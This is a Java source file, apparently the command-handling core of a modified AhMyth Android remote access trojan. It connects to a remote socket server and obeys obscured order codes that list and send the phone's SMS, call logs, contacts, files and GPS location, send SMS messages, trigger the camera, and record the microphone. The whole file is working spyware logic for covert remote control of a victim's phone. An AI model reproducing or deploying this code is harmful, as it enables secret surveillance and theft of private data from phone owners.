package ahmyth.mine.king.ahmyth;

import org.json.JSONObject;
import io.socket.emitter.Emitter;
import android.content.Context;
import android.util.Log;

public class ConnectionManager {

    private static final String TAG = "ConnectionManager";
    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();

    public static void startAsync(Context con) {
        Log.d(TAG, "===================================");
        Log.d(TAG, "ConnectionManager.startAsync() called");
        Log.d(TAG, "===================================");

        try {
            ConnectionManager.context = con;

            // Cek apakah socket sudah ada
            ioSocket = IOSocket.getInstance().getIoSocket();

            if (ioSocket == null) {
                Log.e(TAG, "❌ Socket is NULL in ConnectionManager!");
                Log.d(TAG, ">>> Trying to init socket from ConnectionManager...");
                IOSocket.getInstance().initSocket(con);
                ioSocket = IOSocket.getInstance().getIoSocket();

                if (ioSocket == null) {
                    Log.e(TAG, "❌ Socket STILL NULL after init!");
                    return;
                }
            }

            Log.d(TAG, "✅ Socket object exists");

            // Setup listeners
            sendReq();

        } catch (Exception ex) {
            Log.e(TAG, "❌ Error in startAsync: " + ex.getMessage());
            ex.printStackTrace();
        }
    }

    public static void sendReq() {
        try {
            Log.d(TAG, ">>> Setting up socket listeners...");

            if (ioSocket == null) {
                Log.e(TAG, "❌ Socket is NULL in sendReq!");
                return;
            }

            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.d(TAG, ">>> Received PING");
                    ioSocket.emit("pong");
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("order");
                        Log.d(TAG, ">>> Received ORDER: " + order);

                        switch (order) {
                            case "x0000ca":
                                if (data.getString("extra").equals("camList"))
                                    x0000ca(-1);
                                else if (data.getString("extra").equals("1"))
                                    x0000ca(1);
                                else if (data.getString("extra").equals("0"))
                                    x0000ca(0);
                                break;
                            case "x0000fm":
                                if (data.getString("extra").equals("ls"))
                                    x0000fm(0, data.getString("path"));
                                else if (data.getString("extra").equals("dl"))
                                    x0000fm(1, data.getString("path"));
                                break;
                            case "x0000sm":
                                if (data.getString("extra").equals("ls"))
                                    x0000sm(0, null, null);
                                else if (data.getString("extra").equals("sendSMS"))
                                    x0000sm(1, data.getString("to"), data.getString("sms"));
                                break;
                            case "x0000cl":
                                x0000cl();
                                break;
                            case "x0000cn":
                                x0000cn();
                                break;
                            case "x0000mc":
                                x0000mc(data.getInt("sec"));
                                break;
                            case "x0000lm":
                                x0000lm();
                                break;
                            case "x0000nf":
                                if (data.getString("extra").equals("status"))
                                    x0000nf(0);
                                else if (data.getString("extra").equals("openSettings"))
                                    x0000nf(1);
                                break;
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error handling order: " + e.getMessage());
                        e.printStackTrace();
                    }
                }
            });

            Log.d(TAG, "✅ Socket listeners setup complete");

        } catch (Exception ex) {
            Log.e(TAG, "❌ Error in sendReq: " + ex.getMessage());
            ex.printStackTrace();
        }
    }

    public static void x0000ca(int req) {
        if (req == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if (cameraList != null)
                ioSocket.emit("x0000ca", cameraList);
        } else if (req == 1) {
            new CameraManager(context).startUp(1);
        } else if (req == 0) {
            new CameraManager(context).startUp(0);
        }
    }

    public static void x0000fm(int req, String path) {
        if (req == 0)
            ioSocket.emit("x0000fm", fm.walk(path));
        else if (req == 1)
            fm.downloadFile(path);
    }

    public static void x0000sm(int req, String phoneNo, String msg) {
        if (req == 0)
            ioSocket.emit("x0000sm", SMSManager.getSMSList());
        else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("x0000sm", isSent);
        }
    }

    public static void x0000nf(int req) {
        if (req == 0) {
            ioSocket.emit("x0000nf", NotificationManager.getNotificationStatus(context));
        } else if (req == 1) {
            NotificationManager.openNotificationSettings(context);
        }
    }

    public static void x0000cl() {
        ioSocket.emit("x0000cl", CallsManager.getCallsLogs());
    }

    public static void x0000cn() {
        ioSocket.emit("x0000cn", ContactsManager.getContacts());
    }

    public static void x0000mc(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    public static void x0000lm() throws Exception {
        android.os.Looper.prepare();
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();

        if (gps.canGetLocation()) {
            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            location.put("enable", true);
            location.put("lat", latitude);
            location.put("lng", longitude);
        } else {
            location.put("enable", false);
        }

        ioSocket.emit("x0000lm", location);
    }
}